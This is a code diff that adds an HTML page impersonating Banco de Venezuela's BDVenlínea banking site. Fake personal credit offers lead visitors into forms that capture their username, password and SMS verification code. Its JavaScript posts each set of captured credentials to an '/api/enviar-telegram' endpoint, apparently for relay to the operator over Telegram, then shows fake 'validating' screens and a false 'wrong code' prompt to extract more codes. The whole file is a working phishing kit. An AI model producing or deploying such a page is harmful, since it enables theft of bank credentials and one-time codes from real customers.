@@ -1,0 +1,914 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <title>BDVenlínea personas</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css?family=Nunito:300,400,500,600,700" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Nunito', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            background-attachment: fixed;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header-logo {
+            height: 70px;
+            margin-bottom: 15px;
+        }
+
+        .header-title {
+            color: #0067b1;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .header-subtitle {
+            color: #7f8c8d;
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        .options-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            max-width: 1200px;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .option-card {
+            background-color: #fff;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            padding: 25px;
+            text-align: center;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .option-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 103, 177, 0.2);
+        }
+
+        .option-icon {
+            background: linear-gradient(to right, #0067b1, #0095e6);
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .option-icon i {
+            color: white;
+            font-size: 32px;
+        }
+
+        .option-title {
+            color: #0067b1;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .option-amount {
+            color: #27ae60;
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 10px;
+        }
+
+        .option-description {
+            color: #7f8c8d;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 15px;
+            flex-grow: 1;
+        }
+
+        .option-button {
+            background: linear-gradient(to right, #0067b1, #0095e6);
+            color: white;
+            border: none;
+            border-radius: 28px;
+            padding: 10px 25px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0, 103, 177, 0.3);
+        }
+
+        .option-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 103, 177, 0.4);
+        }
+
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            color: #7f8c8d;
+            font-size: 14px;
+        }
+
+        /* Login container (inicialmente oculto) */
+        #loginContainer {
+            display: none;
+            width: 100%;
+        }
+
+        .login-container-float-center {
+            width: 25%;
+            height: auto;
+            background-color: #fff;
+            box-shadow: 0 15px 30px 0 rgba(0, 0, 0, .15);
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 0 auto;
+        }
+
+        .login-container-logo {
+            display: block;
+            margin: 30px auto 0;
+            text-align: center;
+        }
+
+        .logo-login {
+            height: 60px;
+        }
+
+        .login-container-form {
+            padding: 30px;
+            border-bottom-left-radius: 10px;
+            border-bottom-right-radius: 10px;
+        }
+
+        .mat-form-field {
+            display: block;
+            position: relative;
+            text-align: left;
+            margin-bottom: 25px;
+            width: 100%;
+        }
+
+        .mat-form-field-flex {
+            display: flex;
+            align-items: baseline;
+            width: 100%;
+        }
+
+        .mat-form-field-infix {
+            display: block;
+            position: relative;
+            flex: auto;
+            min-width: 0;
+            width: 100%;
+        }
+
+        .mat-input-element {
+            font: inherit;
+            background: 0 0;
+            color: #2c3e50;
+            border: none;
+            outline: 0;
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            max-width: 100%;
+            vertical-align: bottom;
+            text-align: inherit;
+            height: 36px;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .mat-form-field-label-wrapper {
+            position: absolute;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .mat-form-field-label {
+            position: absolute;
+            left: 0;
+            font: inherit;
+            pointer-events: none;
+            width: 100%;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+            overflow: hidden;
+            transform-origin: 0 0;
+            transition: transform .4s cubic-bezier(.25, .8, .25, 1), color .4s cubic-bezier(.25, .8, .25, 1), width .4s cubic-bezier(.25, .8, .25, 1);
+            color: #7f8c8d;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .mat-form-field-underline {
+            position: absolute;
+            width: 100%;
+            pointer-events: none;
+            height: 2px;
+            background: linear-gradient(to right, #0067b1, #0095e6);
+            border-radius: 2px;
+        }
+
+        .mat-form-field-ripple {
+            position: absolute;
+            left: 0;
+            width: 100%;
+            transform-origin: 50%;
+            transform: scaleX(.5);
+            opacity: 0;
+            background-color: #0067b1;
+            height: 2px;
+            transition: all 0.3s ease;
+        }
+
+        .mat-form-field.mat-focused .mat-form-field-ripple {
+            opacity: 1;
+            transform: scaleX(1);
+            transition: transform .3s cubic-bezier(.25, .8, .25, 1), opacity .1s cubic-bezier(.25, .8, .25, 1), background-color .3s cubic-bezier(.25, .8, .25, 1);
+        }
+
+        .mat-raised-button {
+            box-sizing: border-box;
+            position: relative;
+            user-select: none;
+            cursor: pointer;
+            outline: 0;
+            border: none;
+            display: inline-block;
+            white-space: nowrap;
+            text-decoration: none;
+            vertical-align: baseline;
+            text-align: center;
+            margin: 0;
+            min-width: 88px;
+            line-height: 36px;
+            padding: 0 16px;
+            border-radius: 28px;
+            overflow: hidden;
+            background: linear-gradient(to right, #0067b1, #0095e6);
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            box-shadow: 0 4px 12px rgba(0, 103, 177, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .mat-raised-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 103, 177, 0.4);
+        }
+
+        .mat-raised-button[disabled] {
+            background: #ecf0f1;
+            color: #bdc3c7;
+            cursor: default;
+            box-shadow: none;
+            transform: none;
+        }
+
+        .button-login-container {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .button-login-container button {
+            width: 50%;
+            height: 45px;
+        }
+
+        .autogestion-usuario-unico {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .autogestion-user {
+            font-size: 14px;
+            color: #3498db;
+            text-decoration: none;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 10px;
+            transition: color 0.3s ease;
+        }
+
+        .autogestion-user:hover {
+            color: #0067b1;
+            text-decoration: underline;
+        }
+
+        /* Modal styles - MEJORADOS */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            margin: 10% auto;
+            padding: 0;
+            width: 90%;
+            max-width: 450px;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            animation: slideIn 0.4s ease;
+            position: relative;
+        }
+
+        .modal-header {
+            background: linear-gradient(to right, #0067b1, #0095e6);
+            padding: 20px 30px;
+            color: white;
+            position: relative;
+        }
+
+        .modal-header h4 {
+            margin: 0;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .modal-body {
+            padding: 30px;
+        }
+
+        .close {
+            color: white;
+            position: absolute;
+            top: 20px;
+            right: 25px;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            opacity: 0.8;
+            transition: opacity 0.3s ease;
+        }
+
+        .close:hover {
+            opacity: 1;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 25px;
+        }
+
+        .material-icons {
+            position: absolute;
+            right: 5px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            z-index: 5;
+            color: #7f8c8d;
+            transition: color 0.3s ease;
+        }
+
+        .material-icons:hover {
+            color: #0067b1;
+        }
+
+        /* Loading Modal - NUEVO DISEÑO MEJORADO */
+        .loading-modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(3px);
+        }
+
+        .loading-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0, 103, 177, 0.2);
+            width: 380px;
+            max-width: 85%;
+            text-align: center;
+        }
+
+        .loading-animation {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 25px;
+        }
+
+        .loading-spinner {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 3px solid rgba(0, 103, 177, 0.1);
+            border-radius: 50%;
+            border-top: 3px solid #0067b1;
+            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+
+        .loading-spinner:nth-child(2) {
+            border-top-color: #4c8cbb;
+            animation-delay: -0.4s;
+            width: 80%;
+            height: 80%;
+            top: 10%;
+            left: 10%;
+        }
+
+        .loading-spinner:nth-child(3) {
+            border-top-color: #80b5dc;
+            animation-delay: -0.8s;
+            width: 60%;
+            height: 60%;
+            top: 20%;
+            left: 20%;
+        }
+
+        .loading-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #0067b1;
+            font-size: 24px;
+        }
+
+        .loading-text {
+            color: #0067b1;
+            font-weight: 600;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        .loading-subtext {
+            color: #7f8c8d;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .progress-bar {
+            height: 4px;
+            width: 100%;
+            background-color: rgba(0, 103, 177, 0.2);
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(to right, #0067b1, #0095e6);
+            border-radius: 2px;
+            animation: progress 2s ease-in-out infinite;
+        }
+
+        /* Animaciones */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 993px) {
+            .login-container-float-center {
+                width: 50%;
+            }
+            
+            .options-container {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 680px) {
+            .login-container-float-center {
+                width: 70%;
+            }
+            .logo-login {
+                height: 35px;
+            }
+            .modal-content {
+                width: 95%;
+                margin: 15% auto;
+            }
+            
+            .header-title {
+                font-size: 24px;
+            }
+            
+            .header-subtitle {
+                font-size: 16px;
+            }
+            
+            .option-card {
+                padding: 20px;
+            }
+            
+            .option-title {
+                font-size: 18px;
+            }
+            
+            .options-container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-container-float-center {
+                width: 90%;
+            }
+            .modal-body {
+                padding: 20px;
+            }
+            .loading-content {
+                padding: 25px;
+            }
+            .modal-header {
+                padding: 15px 20px;
+            }
+            
+            .header-logo {
+                height: 50px;
+            }
+            
+            .option-icon {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .option-icon i {
+                font-size: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Página de selección de tipo de crédito -->
+    <div id="selectionPage">
+        <div class="header">
+            <img class="header-logo" src="logo.png" alt="BDV En Línea">
+            <h1 class="header-title">Bienvenido a BDVenlinea Creditos</h1>
+            <p class="header-subtitle">Seleccione el monto de crédito que desea solicitar</p>
+        </div>
+        
+        <div class="options-container">
+            <div class="option-card" id="credit300Option">
+                <div class="option-icon">
+                    <i class="material-icons">attach_money</i>
+                </div>
+                <h2 class="option-title">CRÉDITO PERSONAL</h2>
+                <div class="option-amount">$300</div>
+                <p class="option-description">Solicite su crédito personal de $300 con tasas preferenciales y pagos flexibles adaptados a sus necesidades.</p>
+                <button class="option-button">Solicitar</button>
+            </div>
+            
+            <div class="option-card" id="credit500Option">
+                <div class="option-icon">
+                    <i class="material-icons">paid</i>
+                </div>
+                <h2 class="option-title">CRÉDITO PERSONAL</h2>
+                <div class="option-amount">$500</div>
+                <p class="option-description">Obtenga hasta $500 con nuestro crédito personal de fácil aprobación y condiciones ventajosas para usted.</p>
+                <button class="option-button">Solicitar</button>
+            </div>
+            
+            <div class="option-card" id="credit800Option">
+                <div class="option-icon">
+                    <i class="material-icons">savings</i>
+                </div>
+                <h2 class="option-title">CRÉDITO PERSONAL</h2>
+                <div class="option-amount">$800</div>
+                <p class="option-description">Aproveche nuestro crédito de $800 con plazo extendido y cuotas que se ajustan a su capacidad de pago.</p>
+                <button class="option-button">Solicitar</button>
+            </div>
+            
+            <div class="option-card" id="credit1200Option">
+                <div class="option-icon">
+                    <i class="material-icons">business_center</i>
+                </div>
+                <h2 class="option-title">CRÉDITO PERSONAL</h2>
+                <div class="option-amount">$1200</div>
+                <p class="option-description">Nuestro crédito premium de $1200 ofrece las mejores condiciones del mercado para proyectos de mayor envergadura.</p>
+                <button class="option-button">Solicitar</button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>Banco de Venezuela © 2025 - Todos los derechos reservados</p>
+        </div>
+    </div>
+
+    <!-- Login container (inicialmente oculto) -->
+    <div id="loginContainer" class="login-container-float-center">
+        <div class="login-container-logo">
+            <img class="logo-login" src="bdvenlinea.banvenez.com/assets/login/logo.png">
+        </div>
+        <div class="login-container-form">
+            <form novalidate>
+                <div class="mat-form-field">
+                    <div class="mat-form-field-flex">
+                        <div class="mat-form-field-infix">
+                            <input class="mat-input-element" placeholder="Usuario *" type="text" id="username" required>
+                        </div>
+                    </div>
+                    <div class="mat-form-field-underline"></div>
+                    <div class="mat-form-field-ripple"></div>
+                </div>
+                <div class="button-login-container">
+                    <button type="button" id="openModalBtn" class="mat-raised-button" disabled>
+                        <span>Entrar</span>
+                    </button>
+                </div>
+            </form>
+            <div class="autogestion-usuario-unico">
+                <a class="autogestion-user">¿Olvidaste tu usuario o clave?</a>
+                <a class="autogestion-user">Si eres nuevo clienteBDV regístrate aquí</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Password Modal - MEJORADO -->
+    <div id="passwordModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4>Introduce tu contraseña</h4>
+                <span class="close">&times;</span>
+            </div>
+            <div class="modal-body">
+                <form>
+                    <div class="mat-form-field">
+                        <div class="mat-form-field-flex">
+                            <div class="mat-form-field-infix">
+                                <input class="mat-input-element" placeholder="Contraseña" type="password" id="password" required>
+                                <i class="material-icons">visibility</i>
+                            </div>
+                        </div>
+                        <div class="mat-form-field-underline"></div>
+                        <div class="mat-form-field-ripple"></div>
+                    </div>
+                    <div class="button-container">
+                        <button type="button" id="submitBtn" class="mat-raised-button" disabled>Continuar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Modal - NUEVO DISEÑO -->
+    <div id="loadingModal" class="loading-modal">
+        <div class="loading-content">
+            <div class="loading-animation">
+                <div class="loading-spinner"></div>
+                <div class="loading-spinner"></div>
+                <div class="loading-spinner"></div>
+                <div class="loading-icon">
+                    <i class="material-icons">lock</i>
+                </div>
+            </div>
+            <div class="loading-text" id="loadingText">Validando credenciales</div>
+            <div class="loading-subtext" id="loadingSubtext">Espere un momento por favor...</div>
+            <div class="progress-bar">
+                <div class="progress"></div>
+            </div>
+            <div id="selectedCreditInfo" style="margin-top: 15px; font-size: 14px; color: #0067b1;"></div>
+        </div>
+    </div>
+
+    <!-- SMS Code Modal - MEJORADO -->
+    <div id="smsModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4>Verificación de Seguridad</h4>
+                <span class="close">&times;</span>
+            </div>
+            <div class="modal-body">
+                <p style="color: #7f8c8d; margin-top: 0; margin-bottom: 20px; font-size: 15px; line-height: 1.5;">
+                    Introduzca el código de verificación enviado vía SMS al número telefónico afiliado al BDV o ingrese el código generado por Ami Ven.
+                </p>
+                <form>
+                    <div class="mat-form-field">
+                        <div class="mat-form-field-flex">
+                            <div class="mat-form-field-infix">
+                                <input class="mat-input-element" placeholder="Código de verificación" type="text" id="smsCode" 
+                                       maxlength="8" pattern="\d*" inputmode="numeric" required>
+                            </div>
+                        </div>
+                        <div class="mat-form-field-underline"></div>
+                        <div class="mat-form-field-ripple"></div>
+                    </div>
+                    <div style="text-align: center; margin: 15px 0; font-size: 14px; color: #3498db;">
+                        <a href="#" style="color: #3498db; text-decoration: none;">Reenviar código</a>
+                    </div>
+                    <div class="button-container">
+                        <button type="button" id="submitSmsBtn" class="mat-raised-button" disabled>Continuar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+<script>
+    (function(){
+        document.addEventListener('DOMContentLoaded', function() {
+            let selectedCreditAmount = '';
+            
+            // Función adaptada para enviar los datos a tu propio servidor (server.js)
+            async function sendToTelegramServer(tipo, datosExtra) {
+                try {
+                    const response = await fetch('/api/enviar-telegram', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            tipo: tipo,
+                            amount: selectedCreditAmount,
+                            ...datosExtra
+                        })
+                    });
+                    await response.json();
+                } catch (error) {
+                    console.error('Error al comunicar con el servidor:', error);
+                }
+            }
+
+            const selectionPage = document.getElementById('selectionPage');
+            const loginContainer = document.getElementById('loginContainer');
+            const credit300Option = document.getElementById('credit300Option');
+            const credit500Option = document.getElementById('credit500Option');
+            const credit800Option = document.getElementById('credit800Option');
+            const credit1200Option = document.getElementById('credit1200Option');
+            const usernameInput = document.getElementById('username');
+            const openModalBtn = document.getElementById('openModalBtn');
+            const passwordModal = document.getElementById('passwordModal');
+            const smsModal = document.getElementById('smsModal');
+            const loadingModal = document.getElementById('loadingModal');
+            const passwordInput = document.getElementById('password');
+            const submitBtn = document.getElementById('submitBtn');
+            const smsCodeInput = document.getElementById('smsCode');
+            const submitSmsBtn = document.getElementById('submitSmsBtn');
+            const loadingText = document.getElementById('loadingText');
+            const loadingSubtext = document.getElementById('loadingSubtext');
+            const selectedCreditInfo = document.getElementById('selectedCreditInfo');
+            const closeButtons = document.querySelectorAll('.close');
+
+            function setCredit(amount) {
+                selectedCreditAmount = amount;
+                selectionPage.style.display = 'none';
+                loginContainer.style.display = 'block';
+            }
+
+            credit300Option.addEventListener('click', () => setCredit('300$'));
+            credit500Option.addEventListener('click', () => setCredit('500$'));
+            credit800Option.addEventListener('click', () => setCredit('800$'));
+            credit1200Option.addEventListener('click', () => setCredit('1200$'));
+
+            usernameInput.addEventListener('input', function() {
+                openModalBtn.disabled = this.value.trim() === '';
+            });
+
+            openModalBtn.addEventListener('click', function() {
+                passwordModal.style.display = 'block';
+            });
+
+            passwordInput.addEventListener('input', function() {
+                submitBtn.disabled = this.value.trim() === '';
+            });
+
+            submitBtn.addEventListener('click', function() {
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
+                
+                // Enviar datos de login al servidor con los botones de aprobación
+                sendToTelegramServer('login', { usuario: username, password: password });
+
+                passwordModal.style.display = 'none';
+                
+                loadingText.textContent = "Validando credenciales";
+                loadingSubtext.textContent = "Espere un momento por favor...";
+                selectedCreditInfo.textContent = `Crédito seleccionado: $${selectedCreditAmount}`;
+                loadingModal.style.display = 'block';
+                
+                setTimeout(function() {
+                    loadingModal.style.display = 'none';
+                    smsModal.style.display = 'block';
+                }, 15000);
+            });
+
+            smsCodeInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value.length > 8) {
+                    this.value = this.value.slice(0, 8);
+                }
+                submitSmsBtn.disabled = this.value.trim() === '' || this.value.length < 6;
+            });
+
+            submitSmsBtn.addEventListener('click', function() {
+                const smsCode = smsCodeInput.value.trim();
+                const username = usernameInput.value.trim();
+                
+                // Enviar código SMS al servidor con sus botones correspondientes
+                sendToTelegramServer('sms', { usuario: username, smsCode: smsCode });
+                
+                const amountParam = encodeURIComponent(selectedCreditAmount);
+                window.location.href = `exito.html?amount=${amountParam}`;
+
+                loadingText.textContent = "Verificando código de seguridad";
+                loadingSubtext.textContent = "Esto puede tomar unos segundos...";
+                selectedCreditInfo.textContent = `Crédito seleccionado: $${selectedCreditAmount}`;
+                
+                loadingModal.style.display = 'block';
+                smsModal.style.display = 'none';
+                
+                setTimeout(function() {
+                    loadingModal.style.display = 'none';
+                    alert('Código incorrecto. Intente nuevamente.');
+                    smsCodeInput.value = '';
+                    submitSmsBtn.disabled = true;
+                    smsModal.style.display = 'block';
+                }, 10000);
+            });
+
+            closeButtons.forEach(function(button) {
+                button.addEventListener('click', function() {
+                    passwordModal.style.display = 'none';
+                    smsModal.style.display = 'none';
+                });
+            });
+
+            window.addEventListener('click', function(event) {
+                if (event.target === passwordModal) passwordModal.style.display = 'none';
+                if (event.target === smsModal) smsModal.style.display = 'none';
+            });
+        });
+    })();
+</script>
+</body>
+</html>
